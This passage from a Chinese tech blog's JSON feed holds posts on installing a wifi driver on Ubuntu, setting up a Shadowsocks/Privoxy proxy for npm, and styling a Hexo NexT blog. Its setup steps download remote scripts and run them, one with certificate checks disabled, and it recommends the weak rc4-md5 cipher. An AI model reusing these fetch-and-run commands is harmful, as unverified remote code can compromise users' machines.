      "content_html": "<div><p>前言</p>\n<p>基于已经安装双系统, 或是只有 Ubuntu 系统, 在虚拟机下不存在此问题。</p>\n</div>\n\n<h2 id=\"查看无线网卡信息\" tabindex=\"-1\"> 查看无线网卡信息</h2>\n<div><pre><code>lspci <span>|</span> <span>grep</span> -i network\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"下载无线网卡驱动\" tabindex=\"-1\"> 下载无线网卡驱动</h2>\n<p>本人的无线网卡为 <code>Realtek-RTL8723BE</code> 下载地址 <a href=\"http://oss-blog.test.upcdn.net/rtl8723be.tar.gz?attname=\" target=\"_blank\" rel=\"noopener noreferrer\">rtl8723be.tar.gz</a></p>\n<h3 id=\"驱动安装-解压进入目录\" tabindex=\"-1\"> 驱动安装(解压进入目录)</h3>\n<div><pre><code><span>make</span>\n<span>sudo</span> <span>make</span> <span>install</span>\n<span>sudo</span> modprobe rtl8723be <span>(</span>rtl8723be 需替换成自己的网卡<span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"设置为开机启动项\" tabindex=\"-1\"> 设置为开机启动项</h3>\n<div><pre><code><span>sudo</span> modprobe -r rtl8723be <span>(</span>rtl8723be 需替换成自己的网卡<span>)</span>\n<span>sudo</span> modprobe rtl8723be <span>(</span>rtl8723be 需替换成自己的网卡<span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"重启网卡\" tabindex=\"-1\"> 重启网卡</h3>\n<div><pre><code><span>ifconfig</span> wlan0 down\n<span>ifconfig</span> wlan0 up\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"重启网络服务\" tabindex=\"-1\"> 重启网络服务</h3>\n<div><pre><code><span>service</span> network restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "date_published": "2016-08-01T12:24:19.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "networking"
      ]
    },
    {
      "title": "Ubuntu 下科学上网",
      "url": "https://vxhly.github.io/views/networking/ubuntu-over-the-wall.html",
      "id": "https://vxhly.github.io/views/networking/ubuntu-over-the-wall.html",
      "summary": "前言\n翻墙, 主要用于 npm 的代理。没有 vpn 服务器不要紧, 肯花点小钱就可以搞定访问 高梯子。\n\n",
      "content_html": "<div><p>前言</p>\n<p>翻墙, 主要用于 npm 的代理。没有 vpn 服务器不要紧, 肯花点小钱就可以搞定访问 <a href=\"http://www.gaotizi.com/aff.php?aff=133\" target=\"_blank\" rel=\"noopener noreferrer\">高梯子</a>。</p>\n</div>\n\n<h2 id=\"方法一\" tabindex=\"-1\"> 方法一</h2>\n<h3 id=\"下载-shadowsocks-libev\" tabindex=\"-1\"> 下载 shadowsocks-libev</h3>\n<p>下载 shadowsocks-libev 安装包, 解压并重命名为 shadowsocks-libev</p>\n<p><a href=\"http://github.com/shadowsocks/shadowsocks-libev/archive/v2.4.6.zip\" target=\"_blank\" rel=\"noopener noreferrer\">Source code (zip) 下载地址</a><br> <a href=\"http://github.com/shadowsocks/shadowsocks-libev/archive/v2.4.6.tar.gz\" target=\"_blank\" rel=\"noopener noreferrer\">Source code (tar.gz) 下载地址</a></p>\n<h3 id=\"安装-shadowsocks-libev\" tabindex=\"-1\"> 安装 shadowsocks-libev</h3>\n<div><pre><code><span>cd</span> shadowsocks-libev\n<span>sudo</span> <span>apt-get</span> <span>install</span> build-essential autoconf libtool libssl-dev <span>\\</span>\n    <span>gawk</span> debhelper dh-systemd init-system-helpers pkg-config\ndpkg-buildpackage -us -uc -i\n<span>cd</span> <span>..</span>\n<span>sudo</span> dpkg -i shadowsocks-libev*.deb\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"建议安装前先更新一下软件列表\" tabindex=\"-1\"> 建议安装前先更新一下软件列表</h3>\n<p>如果显示 &quot;现在没有可用的软件包&quot; 等字样, 建议先执行</p>\n<div><pre><code><span>sudo</span> <span>rm</span> /var/lib/apt/lists/* -vf\n<span>sudo</span> <span>apt-get</span> update\n<span>sudo</span> <span>apt-get</span> upgrade\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"配置-config-json-文件\" tabindex=\"-1\"> 配置 config.json 文件</h3>\n<p>使用 <code>vim</code></p>\n<div><pre><code><span>sudo</span> <span>vim</span> /etc/shadowsocks-libev/config.json\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或者使用 <code>gedit</code></p>\n<div><pre><code><span>sudo</span> gedit /etc/shadowsocks-libev/config.json\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"修改服务器地址跟密码\" tabindex=\"-1\"> 修改服务器地址跟密码</h3>\n<div><pre><code><span>{</span>\n  <span>\"server\"</span><span>:</span> <span>\"\"</span><span>,</span>\n  <span>\"server_port\"</span><span>:</span> <span>8388</span><span>,</span>\n  <span>\"local_port\"</span><span>:</span> <span>1080</span><span>,</span>\n  <span>\"password\"</span><span>:</span> <span>\"\"</span><span>,</span>\n  <span>\"timeout\"</span><span>:</span> <span>60</span><span>,</span>\n  <span>\"method\"</span><span>:</span> <span>\"rc4-md5\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"配置-shadowsocks-libev-文件\" tabindex=\"-1\"> 配置 shadowsocks-libev 文件</h3>\n<p>使用 <code>vim</code></p>\n<div><pre><code><span>sudo</span> <span>vim</span> /etc/init.d/shadowsocks-libev\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或者使用 <code>gedit</code></p>\n<div><pre><code><span>sudo</span> gedit /etc/init.d/shadowsocks-libev\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"修改文件\" tabindex=\"-1\"> 修改文件</h3>\n<div><pre><code><span>DAEMON</span><span>=</span>/usr/bin/ss-server\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>=&gt;</p>\n<div><pre><code><span>DAEMON</span><span>=</span>/usr/bin/ss-local\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"启动-shadowsocks-libev\" tabindex=\"-1\"> 启动 shadowsocks-libev</h3>\n<div><pre><code><span>sudo</span> <span>service</span> shadowsocks-libev restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装-privoxy\" tabindex=\"-1\"> 安装 Privoxy</h3>\n<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> privoxy\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"配置-privoxy\" tabindex=\"-1\"> 配置 Privoxy</h3>\n<p>使用 <code>vim</code></p>\n<div><pre><code><span>sudo</span> <span>vim</span> /etc/privoxy/config\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或者使用 <code>gedit</code></p>\n<div><pre><code><span>sudo</span> gedit /etc/privoxy/config\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>按 <code>shift+g</code> 切到最后一行, 添加</p>\n<div><pre><code>forward-socks5 / <span>127.0</span>.0.1:1080 <span>.</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"配置终端-http-代理\" tabindex=\"-1\"> 配置终端 http 代理</h3>\n<div><pre><code><span>export</span> <span>http_proxy</span><span>=</span><span>\"127.0.0.1:8118\"</span>\n<span>export</span> <span>https_proxy</span><span>=</span><span>\"127.0.0.1:8118\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"配置终端-http-代理的启动\" tabindex=\"-1\"> 配置终端 http 代理的启动</h3>\n<p>使用 <code>vim</code></p>\n<div><pre><code><span>sudo</span> <span>vim</span> ~/.bashrc\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或者使用 <code>gedit</code></p>\n<div><pre><code><span>sudo</span> gedit ~/.bashrc\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>按 <code>shift+g</code> 切到最后一行, 添加</p>\n<div><pre><code><span>export</span> <span>http_proxy</span><span>=</span><span>\"127.0.0.1:8118\"</span>\n<span>export</span> <span>https_proxy</span><span>=</span><span>\"127.0.0.1:8118\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>如果此举会影响到终端下载, 建议还是不要设置为好。</p>\n<h3 id=\"启动-privoxy\" tabindex=\"-1\"> 启动 Privoxy</h3>\n<div><pre><code><span>sudo</span> <span>service</span> privoxy restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"测试代理是否成功-需安装-curl\" tabindex=\"-1\"> 测试代理是否成功（需安装 curl）</h3>\n<div><pre><code><span>curl</span> https:https://www.google.com.hk\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>返回带 <code>google</code> 字样表示受理成功</p>\n<h3 id=\"配置-npm-代理-需安装-node、npm\" tabindex=\"-1\"> 配置 npm 代理（需安装 node、npm）</h3>\n<div><pre><code><span>npm</span> config <span>set</span> proxy http://127.0.0.1:8118\n<span>npm</span> config <span>set</span> https-proxy http://127.0.0.1:8118\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"清除-npm-代理\" tabindex=\"-1\"> 清除 npm 代理</h3>\n<div><pre><code><span>npm</span> config delete proxy\n<span>npm</span> config delete https-proxy\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"方法二\" tabindex=\"-1\"> 方法二</h2>\n<h3 id=\"安装-shadowsocks\" tabindex=\"-1\"> 安装 shadowsocks</h3>\n<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> python-gevent python-pip python-setuptools m2crypto\n<span>sudo</span> pip <span>install</span> shadowsocks\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"建议安装前先更新一下软件列表-1\" tabindex=\"-1\"> 建议安装前先更新一下软件列表</h3>\n<div><pre><code><span>sudo</span> <span>apt-get</span> update\n<span>sudo</span> <span>apt-get</span> upgrade\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"新建-shadowsocks-json-文件\" tabindex=\"-1\"> 新建 shadowsocks.json 文件</h3>\n<p>使用 <code>vim</code></p>\n<div><pre><code><span>sudo</span> <span>vim</span> /etc/shadowsocks.json\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或使用 <code>gedit</code></p>\n<div><pre><code><span>sudo</span> gedit /etc/shadowsocks.json\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"添加内容\" tabindex=\"-1\"> 添加内容</h3>\n<div><pre><code><span>{</span>\n  <span>\"server\"</span><span>:</span> <span>\"\"</span><span>,</span>\n  <span>\"server_port\"</span><span>:</span> <span>8388</span><span>,</span>\n  <span>\"local_port\"</span><span>:</span> <span>1080</span><span>,</span>\n  <span>\"password\"</span><span>:</span> <span>\"\"</span><span>,</span>\n  <span>\"timeout\"</span><span>:</span> <span>60</span><span>,</span>\n  <span>\"method\"</span><span>:</span> <span>\"rc4-md5\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"启动-shadowsocks\" tabindex=\"-1\"> 启动 shadowsocks</h3>\n<div><pre><code>sslocal -c /etc/shadowsocks.json\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>设置为启动时自动运行。在 <code>/etc/rc.local</code> 中添加如下命令, 注意在 <code>exit 0</code> 之前。</p>\n<div><pre><code><span>sudo</span> sslocal -c /etc/shadowsocks.json\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装-privoxy-1\" tabindex=\"-1\"> 安装 Privoxy</h3>\n<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> privoxy\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"配置-privoxy-1\" tabindex=\"-1\"> 配置 Privoxy</h3>\n<p>使用 <code>vim</code></p>\n<div><pre><code><span>sudo</span> <span>vim</span> /etc/privoxy/config\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或者使用 <code>gedit</code></p>\n<div><pre><code><span>sudo</span> gedit /etc/privoxy/config\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>修改监听地址</p>\n<div><pre><code>listen-address  <span>127.0</span>.0.1:8118\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>按 <code>shift+g</code> 切到最后一行, 添加</p>\n<div><pre><code>forward-socks5 / <span>127.0</span>.0.1:1080 <span>.</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"启动-privoxy-1\" tabindex=\"-1\"> 启动 Privoxy</h3>\n<div><pre><code><span>sudo</span> /etc/init.d/privoxy restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"配置终端-http-代理-1\" tabindex=\"-1\"> 配置终端 http 代理</h3>\n<div><pre><code><span>export</span> <span>http_proxy</span><span>=</span><span>\"127.0.0.1:8118\"</span>\n<span>export</span> <span>https_proxy</span><span>=</span><span>\"127.0.0.1:8118\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>为了方便还是在 <code>/etc/rc.local</code> 中添加如下命令, 注意在 <code>exit 0</code> 之前。</p>\n<div><pre><code><span>sudo</span> /etc/init.d/privoxy start\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"配置终端-http-代理的启动-1\" tabindex=\"-1\"> 配置终端 http 代理的启动</h3>\n<p>使用 <code>vim</code></p>\n<div><pre><code><span>sudo</span> <span>vim</span> ~/.bashrc\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>或者使用 <code>gedit</code></p>\n<div><pre><code><span>sudo</span> gedit ~/.bashrc\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>按 <code>shift+g</code> 切到最后一行, 添加</p>\n<div><pre><code><span>export</span> <span>http_proxy</span><span>=</span><span>\"127.0.0.1:8118\"</span>\n<span>export</span> <span>https_proxy</span><span>=</span><span>\"127.0.0.1:8118\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>如果此举会影响到终端下载, 建议还是不要设置为好。</p>\n<h3 id=\"测试代理是否成功-需安装-curl-1\" tabindex=\"-1\"> 测试代理是否成功（需安装 curl）</h3>\n<div><pre><code><span>curl</span> https://www.google.com.hk\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>返回带 <code>google</code> 字样表示受理成功</p>\n<h3 id=\"配置-npm-代理-需安装-node、npm-1\" tabindex=\"-1\"> 配置 npm 代理（需安装 node、npm）</h3>\n<div><pre><code><span>npm</span> config <span>set</span> proxy http://127.0.0.1:8118\n<span>npm</span> config <span>set</span> https-proxy http://127.0.0.1:8118\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"清除-npm-代理-1\" tabindex=\"-1\"> 清除 npm 代理</h3>\n<div><pre><code><span>npm</span> config delete proxy\n<span>npm</span> config delete https-proxy\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"附上-shadowsocks-服务器搭建方法\" tabindex=\"-1\"> 附上 Shadowsocks 服务器搭建方法</h2>\n<p>首先你要有一台专属于你的服务器, <a href=\"http://www.hostker.com/\" target=\"_blank\" rel=\"noopener noreferrer\">hostker</a> 这里提供较为便宜的服务器</p>\n<h3 id=\"更新软件源\" tabindex=\"-1\"> 更新软件源</h3>\n<p>安装前最好先更新一下软件源</p>\n<div><pre><code><span>sudo</span> <span>apt-get</span> update\n<span>sudo</span> <span>apt-get</span> upgrade\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"安装-shadowsocks-服务端\" tabindex=\"-1\"> 安装 Shadowsocks 服务端</h3>\n<p>使用 <code>pip</code> 方式安装</p>\n<div><pre><code><span>apt-get</span> <span>install</span> python-pip\npip <span>install</span> shadowsocks\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>pip 安装时候可能会报错, 执行以下命令再重新安装一次</p>\n<div><pre><code><span>wget</span> //bootstrap.pypa.io/ez_setup.py -O - <span>|</span> python\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>当然你也可以更新一下 <code>pip</code></p>\n<div><pre><code>pip <span>install</span> --upgrade pip\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"启动-shadowsocks-服务端\" tabindex=\"-1\"> 启动 Shadowsocks 服务端</h3>\n<div><pre><code>ssserver -p <span>8388</span> -k password -m rc4-md5 --user nobody -d start\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>其中 <code>8388</code> 是远程服务器端口, <code>password</code> 是连接密码, <code>rc4-md5</code> 是加密方式</p>\n<h3 id=\"shadowsocks-windows-端\" tabindex=\"-1\"> Shadowsocks Windows 端</h3>\n<p><a href=\"http://github.com/shadowsocks/shadowsocks-windows/releases\" target=\"_blank\" rel=\"noopener noreferrer\">shadowsocks-windows</a></p>\n<h2 id=\"使用-shadowsocks-libev-一键安装脚本\" tabindex=\"-1\"> 使用 shadowsocks-libev 一键安装脚本</h2>\n<h3 id=\"默认配置\" tabindex=\"-1\"> 默认配置:</h3>\n<ul>\n<li>服务器端口: <code>8989</code></li>\n<li>客户端端口: <code>1080</code></li>\n<li>密码: 自己设定（如不设定, 默认为 <code>teddysun.com</code> ）</li>\n</ul>\n<h3 id=\"下载安装\" tabindex=\"-1\"> 下载安装</h3>\n<h4 id=\"centos-系统\" tabindex=\"-1\"> CentOS 系统</h4>\n<div><pre><code><span>wget</span> --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev.sh\n<span>chmod</span> +x shadowsocks-libev.sh\n./shadowsocks-libev.sh <span><span>2</span>></span><span>&amp;1</span> <span>|</span> <span>tee</span> shadowsocks-libev.log\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h4 id=\"ubuntu-debian-系统\" tabindex=\"-1\"> Ubuntu, Debian 系统</h4>\n<div><pre><code><span>wget</span> --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev-debian.sh\n<span>chmod</span> +x shadowsocks-libev-debian.sh\n./shadowsocks-libev-debian.sh <span><span>2</span>></span><span>&amp;1</span> <span>|</span> <span>tee</span> shadowsocks-libev-debian.lo\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h4 id=\"安装完成\" tabindex=\"-1\"> 安装完成</h4>\n<p>安装完成后, 脚本提示如下:</p>\n<div><pre><code>Congratulations, shadowsocks-libev <span>install</span> completed<span>!</span>\nYour Server IP:your_server_ip\nYour Server Port:8989\nYour Password:your_password\nYour Local IP:127.0.0.1\nYour Local Port:1080\nYour Encryption Method:aes-256-cfb\n\nWelcome to visit://teddysun.com/357.html\nEnjoy it<span>!</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"卸载方法\" tabindex=\"-1\"> 卸载方法:</h3>\n<p>使用 <code>root</code> 用户登录, 运行以下命令:</p>\n<div><pre><code>./shadowsocks-libev.sh uninstall\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"查看进程是否存在\" tabindex=\"-1\"> 查看进程是否存在</h3>\n<p>安装完成后即已后台启动 shadowsocks , 运行:</p>\n<div><pre><code><span>ps</span> -ef <span>|</span> <span>grep</span> ss-server <span>|</span> <span>grep</span> -v <span>ps</span> <span>|</span> <span>grep</span> -v <span>grep</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"其他命令\" tabindex=\"-1\"> 其他命令</h3>\n<ul>\n<li>启动: <code>/etc/init.d/shadowsocks start</code></li>\n<li>停止: <code>/etc/init.d/shadowsocks stop</code></li>\n<li>重启: <code>/etc/init.d/shadowsocks restart</code></li>\n<li>查看状态: <code>/etc/init.d/shadowsocks status</code></li>\n</ul>\n",
      "date_published": "2016-07-31T21:32:24.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "networking"
      ]
    },
    {
      "title": "Hexo+NexT 进阶设置",
      "url": "https://vxhly.github.io/views/nodejs/hexo-next-advanced-settings.html",
      "id": "https://vxhly.github.io/views/nodejs/hexo-next-advanced-settings.html",
      "summary": "前言\nHEXO 博客最近大更新, 页面与之前大不相同, 这里跟大家分享一下相关的设置方法。\n\n",
      "content_html": "<div><p>前言</p>\n<p>HEXO 博客最近大更新, 页面与之前大不相同, 这里跟大家分享一下相关的设置方法。</p>\n</div>\n\n<h2 id=\"highlight-js\" tabindex=\"-1\"> highlight.js</h2>\n<p><a href=\"https://highlightjs.org/\" target=\"_blank\" rel=\"noopener noreferrer\">highlightjs 官方网站</a></p>\n<p>Next 自带的代码高亮并不符合我的口味, 所以就采用了第三方的 <code>highlight.js</code></p>\n<h2 id=\"use\" tabindex=\"-1\"> Use</h2>\n<h3 id=\"编辑配置文件\" tabindex=\"-1\"> 编辑配置文件</h3>\n<p>先禁用默认的高亮方式</p>\n<p><code>./_config.yml</code></p>\n<div><pre><code><span>highlight</span><span>:</span>\n  <span>enable</span><span>:</span> <span>false</span>\n<span>line_number</span><span>:</span> <span>true</span>\n<span>autoi_detect</span><span>:</span> <span>true</span>\n<span>tab_replace</span><span>:</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"引入第三方-highlight\" tabindex=\"-1\"> 引入第三方 highlight</h3>\n<h4 id=\"编辑主题源文件\" tabindex=\"-1\"> 编辑主题源文件</h4>\n<p><code>./themes/layout/_layout.swing</code></p>\n<p>注意这边需要引入样式, 相关的样式以及支持的语言请查看 <a href=\"https://highlightjs.org/static/demo/\" target=\"_blank\" rel=\"noopener noreferrer\">176 languages and 79 styles</a></p>\n<p>因为个人比较喜欢 <code>Atom</code> 这款编辑器, 改编辑器用默认的样式为 <code>atom-one-dark</code> , 所以这里采用该样式</p>\n<div><pre><code><span><span><span>&lt;</span>link</span>\n  <span>rel</span><span><span>=</span><span>\"</span>stylesheet<span>\"</span></span>\n  <span>href</span><span><span>=</span><span>\"</span>//cdn.bootcss.com/highlight.js/9.12.0/styles/atom-one-dark.min.css<span>\"</span></span>\n<span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>除了引入样式, 还需初始化 highlightjs, 这里提供的代码是可以显示行号的</p>\n<div><pre><code><span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>\"</span>//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js<span>\"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n<span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>\"</span>text/javascript<span>\"</span></span><span>></span></span><span><span>\n  <span>$</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>\n    hljs<span>.</span><span>initHighlighting</span><span>(</span><span>)</span><span>;</span>\n    <span>$</span><span>(</span><span>\"pre code\"</span><span>)</span><span>.</span><span>each</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>\n      <span>var</span> lines <span>=</span> <span>$</span><span>(</span><span>this</span><span>)</span><span>.</span><span>text</span><span>(</span><span>)</span><span>.</span><span>split</span><span>(</span><span>\"\\n\"</span><span>)</span><span>.</span>length <span>-</span> <span>1</span><span>;</span>\n      <span>var</span> $numbering <span>=</span> <span>$</span><span>(</span><span>\"&lt;ul/>\"</span><span>)</span><span>.</span><span>addClass</span><span>(</span><span>\"pre-numbering\"</span><span>)</span><span>;</span>\n      <span>$</span><span>(</span><span>this</span><span>)</span><span>.</span><span>addClass</span><span>(</span><span>\"has-numbering\"</span><span>)</span><span>.</span><span>parent</span><span>(</span><span>)</span><span>.</span><span>append</span><span>(</span>$numbering<span>)</span><span>;</span>\n      <span>for</span> <span>(</span>i <span>=</span> <span>1</span><span>;</span> i <span>&lt;=</span> lines<span>;</span> i<span>++</span><span>)</span> <span>{</span>\n        $numbering<span>.</span><span>append</span><span>(</span><span>$</span><span>(</span><span>\"&lt;li/>\"</span><span>)</span><span>)</span><span>;</span>\n      <span>}</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>可以看到以上的代码是有添加 class 样式的, 所以还需补上相关的样式表, 以下的样式表在小分辨率的情况下行号是不显示出来的, 优化效果请参照本博客代码高亮区块</p>\n<div><pre><code><span><span><span>&lt;</span>style</span><span>></span></span><span><span>\n  <span>pre</span> <span>{</span>\n    <span>position</span><span>:</span> relative<span>;</span>\n    <span>padding</span><span>:</span> 0<span>;</span>\n  <span>}</span>\n\n  <span>code.has-numbering</span> <span>{</span>\n    <span>margin-left</span><span>:</span> 2.5rem<span>;</span>\n  <span>}</span>\n\n  <span>code.has-numbering::-webkit-scrollbar</span> <span>{</span>\n    <span>display</span><span>:</span> none<span>;</span>\n  <span>}</span>\n\n  <span>.pre-numbering</span> <span>{</span>\n    <span>margin</span><span>:</span> 0<span>;</span>\n    <span>position</span><span>:</span> absolute<span>;</span>\n    <span>top</span><span>:</span> 0<span>;</span>\n    <span>display</span><span>:</span> flex<span>;</span>\n    <span>flex-direction</span><span>:</span> column<span>;</span>\n    <span>justify-content</span><span>:</span> center<span>;</span>\n    <span>height</span><span>:</span> 100%<span>;</span>\n  <span>}</span>\n\n  <span>.pre-numbering li</span> <span>{</span>\n    <span>list-style-type</span><span>:</span> decimal-leading-zero <span>!important</span><span>;</span>\n  <span>}</span>\n\n  <span><span>@media</span> <span>(</span><span>max-width</span><span>:</span> 760px<span>)</span></span> <span>{</span>\n    <span>.post-body pre</span> <span>{</span>\n      <span>padding</span><span>:</span> 0px<span>;</span>\n    <span>}</span>\n\n    <span>.post-body .pre-numbering</span> <span>{</span>\n      <span>display</span><span>:</span> none<span>;</span>\n    <span>}</span>\n\n    <span>code.has-numbering</span> <span>{</span>\n      <span>margin</span><span>:</span> 0<span>;</span>\n    <span>}</span>\n  <span>}</span>\n</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"copy\" tabindex=\"-1\"> Copy</h2>\n<div><pre><code><span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>\"</span>https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js<span>\"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>这边不就贴关键代码了, 请移步 <a href=\"https://github.com/zenorocha/clipboard.js\" target=\"_blank\" rel=\"noopener noreferrer\">clipboard.js</a> <a href=\"https://github.com/vxhly/vxhly.github.io/blob/blog-source/themes/next/layout/_layout.swig\" target=\"_blank\" rel=\"noopener noreferrer\">_layout.swig</a></p>\n</div>\n<h2 id=\"优化-blockquote\" tabindex=\"-1\"> 优化 blockquote</h2>\n<p>默认的引用 blockquote 样式比较丑, 写了一些样式优化它, 优化效果请参照本博客的引用区块</p>\n<h3 id=\"编辑主题源文件-1\" tabindex=\"-1\"> 编辑主题源文件</h3>\n<p><code>./themes/layout/_layout.swing</code></p>\n<div><pre><code><span><span><span>&lt;</span>style</span><span>></span></span><span><span>\n  <span>blockquote</span> <span>{</span>\n    <span>color</span><span>:</span> #888<span>;</span>\n    <span>background-color</span><span>:</span> #eae6f3<span>;</span>\n    <span>border-left</span><span>:</span> 1rem solid #5236a0<span>;</span>\n    <span>padding</span><span>:</span> 0 1.5rem<span>;</span>\n    <span>position</span><span>:</span> relative<span>;</span>\n    <span>font-family</span><span>:</span> <span>\"Roboto\"</span><span>,</span> sans-serif<span>;</span>\n  <span>}</span>\n\n  <span>blockquote:before,\n  blockquote:after</span> <span>{</span>\n    <span>color</span><span>:</span> #392570<span>;</span>\n    <span>font-size</span><span>:</span> 2.5rem<span>;</span>\n    <span>position</span><span>:</span> absolute<span>;</span>\n    <span>line-height</span><span>:</span> 2.5rem<span>;</span>\n  <span>}</span>\n\n  <span>blockquote:before</span> <span>{</span>\n    <span>content</span><span>:</span> <span>\"\\201C\"</span><span>;</span>\n    <span>left</span><span>:</span> -1rem<span>;</span>\n    <span>top</span><span>:</span> 0<span>;</span>\n  <span>}</span>\n\n  <span>blockquote:after</span> <span>{</span>\n    <span>content</span><span>:</span> <span>\"\\201D\"</span><span>;</span>\n    <span>right</span><span>:</span> 0<span>;</span>\n    <span>bottom</span><span>:</span> -1rem<span>;</span>\n  <span>}</span>\n</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"网站已运行时间\" tabindex=\"-1\"> 网站已运行时间</h2>\n<h3 id=\"编辑主题源文件-2\" tabindex=\"-1\"> 